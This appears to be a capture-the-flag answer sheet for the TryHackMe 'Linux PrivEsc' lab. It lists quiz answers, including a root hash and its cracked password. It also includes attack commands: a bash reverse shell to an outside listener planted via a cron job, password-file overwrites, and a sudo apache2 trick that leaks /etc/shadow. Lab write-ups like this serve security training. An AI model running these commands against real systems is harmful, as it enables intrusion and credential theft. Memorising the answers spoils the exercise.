# Linux PrivEsc

* IP = 10.10.163.8
* <a href="https://tryhackme.com/room/linuxprivesc">Room Link</a>

## Task 1:

1. Deploy the machine and login to the "user" account using SSH.<br>
*Ans-No Answer Needed*

2. Run the "id" command. What is the result?<br>
**Ans-uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)**

## Task 2(Service Exploits):

1. Read Above<br>
*No Answers Needed*

## Task 3(Readable /etc/shadow):

1. What is the root user's password hash?<br>
**Ans-$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0**

2. What hashing algorithm was used to produce the root user's password hash?<br>
**Ans-sha512crypt**

3. What is the root user's password?<br>
**Ans-password123**

## Task 4(Writable /etc/shadow):

```bash
mkpasswd -m sha-512 newpasswordhere
```
1. Read Above<br>
*No Answers Needed*

## Task 5(Writable /etc/passwd):

```bash
openssl passwd newpasswordhere
su root
```

1. Run the "id" command as the newroot user. What is the result?<br>
**Ans-uid=0(root) gid=0(root) groups=0(root)**

## Task 6( Sudo - Shell Escape Sequences):

1. How many programs is "user" allowed to run via sudo?<br>
**Ans-11**

2. One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?<br>
**Ans-apache2**

3. Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.<br>
*No Answers Needed*
```bash
sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
* Now crack the hash

## Task 7(Sudo - Environment Variables):

1. Read and follow along with the above.<br>
*No Answers Needed*

## Task 8(Cron Jobs - File Permissions):

1. Read Above<br>
*No Answers Needed*
* Privesc using bash and a listener:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.4.50.128/4444 0>&1
```

## Task 9(Cron Jobs - PATH Environment Variable):

1. What is the value of the PATH variable in /etc/crontab?<br>
**Ans-/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin**

## Task 10(Cron Jobs - Wildcards):

1. Read Above<br>
*No Answers Needed*

## Task 11(SUID / SGID Executables - Known Exploits):

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
1. Read Above<br>
*No Answers Needed*

## Task 12(SUID / SGID Executables - Shared Object Injection):

1. Read Above<br>
*No Answers Needed*

## Task 13(SUID / SGID Executables - Environment Variables):

1.Read Above<br>
*No Answers Needed*

## Task 14(SUID / SGID Executables - Abusing Shell Features (/#1)):

1. Read Above<br>
*No Answers Needed*

## Task 15(SUID / SGID Executables - Abusing Shell Features (/#2)):

1. Read Above<br>
*No Answers Needed*

## Task 16(Passwords & Keys - History Files):

1. What is the full mysql command the user executed?<br>
**Ans-mysql -h somehost.local -uroot -ppassword123**

## Task 17(Passwords & Keys - Config Files):

1. What file did you find the root user's credentials in?<br>
**Ans-/etc/openvpn/auth.txt**

## Task 18(Passwords & Keys - SSH Keys):

1.Read Above<br>
*No Answers Needed*

## Task 19(NFS):

1. What is the name of the option that disables root squashing?<br>
**Ans-no_root_squash**

## Task 20(Kernel Exploits):

1. Read Above<br>
*No Answers Needed*

## Task 21:

1. Read Above<br>
*No Answers Needed*
